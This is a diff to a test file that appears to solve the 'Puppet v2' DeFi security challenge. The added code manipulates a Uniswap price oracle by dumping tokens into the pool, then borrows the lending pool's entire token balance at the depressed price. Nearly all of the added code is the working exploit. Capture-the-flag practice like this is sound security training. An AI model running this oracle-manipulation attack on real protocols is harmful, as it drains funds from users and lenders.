@@ -82,6 +82,33 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log('1');
+        console.log('current price', (await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).toString());
+        console.log('2');
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        console.log('3');
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [ this.token.address, this.weth.address ],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+            //{ value: ATTACKER_INITIAL_TOKEN_BALANCE }
+        );
+        const depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('current deposit required', depositRequired.toString());
+
+        const attackerBalance = await ethers.provider.getBalance(attacker.address);
+        console.log('attacker\'s balance', attackerBalance.toString(), (await this.weth.balanceOf(attacker.address)).toString());
+        if (attackerBalance < depositRequired) console.error('not enough ETH');
+        
+        await this.weth.connect(attacker).deposit({value: depositRequired}); // https://ethereum.stackexchange.com/a/112873
+        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+    
     });
 
     after(async function () {
